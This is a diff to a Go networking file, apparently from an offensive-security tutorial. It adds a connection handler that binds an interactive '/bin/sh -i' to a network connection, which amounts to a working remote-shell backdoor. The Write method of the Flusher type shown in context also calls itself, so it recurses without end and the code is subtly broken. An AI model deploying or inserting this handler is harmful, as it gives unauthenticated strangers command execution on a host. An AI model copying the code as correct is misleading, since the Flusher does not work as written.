@@ -3,7 +3,9 @@ package main
 import (
 	"bufio"
 	"io"
+	"log"
 	"net"
+	"os/exec"
 )
 
 // Building a TCP Proxy
@@ -231,7 +233,6 @@ func NewFlusher(w io.Writer) *Flusher {
 }
 
 // Write writes bytes and explicitly flushes buffer.
-
 func (foo *Flusher) Write(b []byte) (int, error) {
 	count, err := foo.Write(b)
 
@@ -250,4 +251,22 @@ func handler(conn net.Conn) {
 	// Explicitly calling /bin/sh and using -i for interactive mode
 	// so that we can use it for stdin and stdout.
 	// For Windows use exec.Command("cmd.exe").
+
+	// the first param is the cmd and the the second param is the argument
+	cmd := exec.Command("/bin/sh", "-i")
+
+	// Set stdin to our connection
+	cmd.Stdin = conn
+
+	// Create a Flusher from the connection to use for stdout.
+	// This ensures stdout is flushed adequately and sent via net.Conn.
+
+	cmd.Stdout = NewFlusher(conn)
+
+	// Run the command.
+
+	if err := cmd.Run(); err != nil {
+		log.Fatalln(err)
+	}
+
 }
